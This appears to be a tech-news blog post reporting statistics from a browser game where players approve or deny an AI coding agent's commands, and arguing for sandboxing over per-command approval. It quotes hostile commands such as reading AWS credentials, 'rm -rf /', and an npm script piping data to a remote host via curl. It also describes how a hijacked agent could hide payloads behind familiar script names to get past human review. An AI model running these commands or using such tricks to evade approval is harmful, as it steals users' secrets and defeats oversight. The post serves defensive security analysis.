# The Human-in-the-Loop Is Missing 1 in 3 Threats: 409,000 Agent Permission Decisions Say So

> In a browser game that simulates approving commands for a rogue-prone AI coding agent, 40,000 players made 409,000 approve/deny decisions — and the average human caught only two-thirds of the threats. The last line of defense is statistically leaky.

## What Happened

Scale X (run by Alex Wauters, ex-Staff Engineer at Uber) shipped a small browser game, `llmgame.scalex.dev`, that turns the user into the human-in-the-loop for an AI coding agent. Players approve or deny commands under time pressure; some are routine (`git status`, `npm test`), some indicate the agent has been hijacked and is exfiltrating secrets (`cat ~/.aws/credentials`). After adding telemetry, the data rolled in: **over 40,000 runs and 409,000 individual approve/deny decisions**.

The headline numbers are uncomfortable. The average player **missed 1 in 3 threats (mean accuracy 66.3%)**. **32.9% of sessions ended with a negative score** — penalties from approved threats and blocked safe commands outweighed everything done right. Only 35.2% caught every threat, and just 20.8% did so without blocking everything in sight. A non-trivial **7% approved every single prompt** — enthusiastic users of `--dangerously-skip-permissions`.

The miss rate varies by threat class in a revealing way. Obvious destructive commands (`rm -rf /`, `chmod -R 777 /`) are caught almost always: only **11.7% missed**. Persistent mutations (crontab injection, git config hijack) slip through at **23.8%**. Exfiltration and code execution (curl to unknown APIs, typosquatted packages) at **33.4%**. And the category that actually steals your credentials — scope violations like `cat ~/.aws/credentials` — is missed **35.0%** of the time, roughly three times more often than the blatant destruction.

The single most-missed command is `npm run analyze`, approved **64.7%** of the time. The game even displays what the script actually does in the agent's history log — a pipeline that ends in `curl -X POST https://api.bundle.track/report -d @-`. Players approved anyway. Pooled across the three `npm run` traps, miss rate was **52.5%** versus **28.4%** for other exfiltration attacks: hiding a payload behind a familiar script name roughly doubles its success rate, even when the payload is visible right above the prompt.

## Why It Matters

This is empirical confirmation of something security researchers have warned about since agent permission prompts became mainstream: **the human gate is the weakest component of the whole system**. The problem is structural, not a matter of user diligence.

First, the permission prompt model itself is unsound, as one HN commenter put it: "`npm run build` = run an arbitrary shell command written in package.json." An agent can edit `package.json` or plant code in `node_modules` without asking permission, and then a previously-benign command becomes malicious. Asking a human to validate commands "which are nearly all of the time safe, but aren't anymore because of modified files" is not a strong safeguard — the human literally lacks the context to decide.

Second, there is measurable **permission fatigue**. Anthropic has acknowledged this in Claude Code: the more approvals a user sees, the less attention they pay to each. The game's data shows the miss rate climbing back up toward the end of sessions after an initial warm-up. Meanwhile the cost of vigilance cuts the other way: benign commands get blocked constantly (`npm config set registry https://npm.internal` — blocked 59% of the time; `rm -rf dist/` — blocked 45%). This noise trains users to lower their guard.

## Impact

For developers and agent-framework designers, the takeaway is that **per-command approval is a UX convenience, not a security boundary**. The data argues for shifting trust away from human review and into the environment:

- **Sandbox everything.** If a rogue agent can only touch a disposable container, an approved `curl` to a remote server costs nothing.
- **Separate credentials from what agents read.** `cat ~/.zshrc` is harmless for developers who keep no secrets there and credential disclosure for those who export API keys — the risk depends on setup the agent can't see. Sourcing a separate secrets file reduces the blast radius.
- **Reduce the approval surface.** Features like Anthropic's Auto Mode (auto-determine safety before asking) help but are not fool-proof, per the author. The design goal should be minimizing what humans must review, not making reviews more frequent.
- **Expect more framework-level guards** — least-privilege file access, read-only mode as default, and network egress control — because the human-in-the-loop, at 66% accuracy under pressure, will not hold the line alone.

The game is a toy; the numbers are a warning. As agents gain command authority over our repos, terminals, and cloud accounts, treating the approval dialog as the security layer is a bet the data says we are losing.

---

*Published by [九地之下 Tech Insights](https://github.com/robin202208/nine-under-tech-insights) | Source: [Scale X — AI agent permissions stats](https://scalex.dev/blog/ai-agent-permissions-stats/) | HN Discussion: [251 points, 190 comments](https://news.ycombinator.com/item?id=49195468)*
